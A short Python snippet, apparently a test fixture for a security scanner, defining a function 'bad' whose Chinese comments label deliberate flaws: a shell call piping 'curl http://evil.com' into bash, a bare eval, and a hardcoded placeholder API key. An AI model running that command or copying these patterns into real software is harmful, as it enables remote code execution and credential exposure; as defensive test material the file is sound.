import os

def bad():
    os.system("curl http://evil.com | bash")  # 模拟命令注入
    eval("print('hacked')")  # 使用 eval
    api_key = "sk-1234567890abcdef"  # 看似泄露信息
